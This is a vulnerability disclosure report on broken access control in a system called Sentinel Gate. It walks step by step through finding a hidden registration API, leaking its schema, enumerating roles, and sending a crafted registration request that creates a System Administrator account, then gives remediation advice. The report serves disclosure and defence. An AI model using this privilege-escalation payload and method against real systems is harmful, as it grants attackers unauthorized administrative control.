Unauthorized Admin Creation via Hidden API Registration

DATE: 2026-08-12 SEVERITY: CRITICAL CATEGORY: BROKEN_ACCESS_CONTROL

EXECUTIVE SUMMARY

This analysis demonstrates a Critical vulnerability in the Sentinel Gate infrastructure. While the frontend lacks a registration page (returning a 404 error), the underlying API remains active. By leveraging verbose error messages and role enumeration, an attacker can provision a new account with System Administrator privileges, bypassing all intended access controls.

EXPLOITATION_POC (VIDEO)

TECHNICAL_WALKTHROUGH

1. Reconnaissance: Initial inspection of /register returned a standard 404 page. However, intercepting the login request revealed an active API structure under /api/v1/auth/login.

2. Schema Discovery: By changing the endpoint to /register in Burp Repeater and sending an empty payload, the server leaked the required JSON schema for account creation.

API_SCHEMA_LEAK
HTTP/1.1 400 BAD REQUEST
{
    "status": "validation_error",
    "required_schema": ["full_name", "email", "password", "confirm_password", "role_id"]
}

3. Role Enumeration: Further investigation of the API revealed an unsecured roles endpoint. Fetching GET /api/v1/roles provided the unique identifier for the administrative role.

ROLE_ENUMERATION_LOG
{
    "role_id": "RL-9928-ADM-X",
    "name": "System Administrator",
    "description": "Full administrative control..."
}

4. Exploitation: A registration request was crafted using the identity "Hacked By Primz" and the leaked role_id. The server accepted the request, returning a 201 Created status.

BURP_REPEATER_PAYLOAD
POST /api/v1/auth/register HTTP/1.1
{
    "full_name": "Hacked By Primz",
    "email": "hacked@redacted.com",
    "password": "admin",
    "confirm_password": "admin",
    "role_id": "RL-9928-ADM-X"
}

5. Impact: Using the new credentials, access was granted to the Central Control Console, exposing encrypted network statuses and node configurations.

REMEDIATION_STRATEGY

To mitigate this vulnerability, the registration API should be entirely disabled if not required. Furthermore, administrative roles must never be assignable via public endpoints. Implement Server-Side Role Mapping where only pre-authorized identities can hold elevated privileges.
